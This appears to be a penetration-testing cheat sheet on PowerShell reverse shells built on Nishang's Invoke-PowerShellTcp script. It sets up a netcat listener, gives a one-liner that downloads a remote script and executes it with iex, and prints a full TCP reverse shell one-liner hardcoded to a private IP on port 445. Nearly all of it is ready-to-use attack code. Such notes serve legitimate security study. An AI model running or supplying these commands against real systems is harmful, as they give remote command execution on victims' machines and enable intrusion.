# PowerShell

#### Invoke-PowerShellTcp.ps1
Start a local web server with Invoke-PowerShellTcp.ps1. 
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

1. Create a [NetCat](https://linux.die.net/man/1/nc) listener. 

```
nc -lnvp PORT
```

2. Load from local HTTP client, then execute.

```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

2. Or execute the connection manually.

```
Invoke-PowerShellTcp -Reverse -IPAddress IP -Port PORT
```

### One-liner 
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

Change the IP Address and Port to be correct, then this can be saved as a simple `revshell.ps1`

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.49.163',445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```